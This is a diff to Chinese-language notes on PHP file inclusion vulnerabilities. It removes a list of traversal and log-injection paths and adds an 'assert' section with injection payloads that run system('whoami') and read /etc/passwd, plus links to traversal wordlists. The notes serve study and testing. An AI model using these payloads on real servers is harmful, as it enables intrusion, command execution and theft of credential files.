@@ -15,15 +15,6 @@
 例如：
 $_GET['filename']参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改$_GET['filename']的值，执行非预期的操作。
 
-考虑常用的几种包含方式为:
-
-- 同目录包含 ``file=.htaccess``
-- 目录遍历 ``?file=../../../../../../../../../var/lib/locate.db``
-- 日志注入 ``?file=../../../../../../../../../var/log/apache/error.log``
-- 利用 ``/proc/self/environ``
-
-其中日志可以使用SSH日志或者Web日志等多种日志来源测试
-
 触发Sink
 ----------------------------------------
 - PHP文件包含函数有以下四种
@@ -37,7 +28,6 @@ $_GET['filename']参数开发者没有经过严格的过滤，直接带入了inc
 
 本地文件包含漏洞
 ----------------------------------------
-
 - 无限制本地文件包含漏洞
 - session文件包含漏洞
 	利用条件：session的存储位置可以获取。(phpinfo()或猜测,如linux下默认存储在/var/lib/php/session目录下)
@@ -158,6 +148,13 @@ url编码绕过
 	payload为 ``?file=php://filter/convert.base64-encode/resource=index.php`` 
 - data伪协议读取文件内容
 	payload为 ``?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=`` 的形式，要求 ``allow_url_include=On``
+	
+assert
+-----------------------------------------
+- ``assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");``
+- ``' and die(show_source('/etc/passwd')) or '``
+- ``' and die(system("whoami")) or '``
+- ``assert("strpos('' and die(system("whoami")) or '', '..') === false") or die("Detected hacking attempt!");``
 
 常见的敏感信息路径：
 ----------------------------------------
@@ -171,6 +168,8 @@ Windows系统
 	c:\ProgramFiles\mysql\my.ini // MySQL配置
 	c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
 	c:\windows\php.ini // php 配置信息
+	
+payload:https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt
 
 Linux/Unix系统
 
@@ -189,7 +188,7 @@ Linux/Unix系统
 	.htaccess		//文件中的配置指令作用于.htaccess文件所在的目录及其所有子目录
 	.htpasswd		//HTTP用户的basic认证密码文件，一般在/var/www(/mysite)/.htpasswd
 
-
+payload:https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt
 
 参考链接
 ----------------------------------------
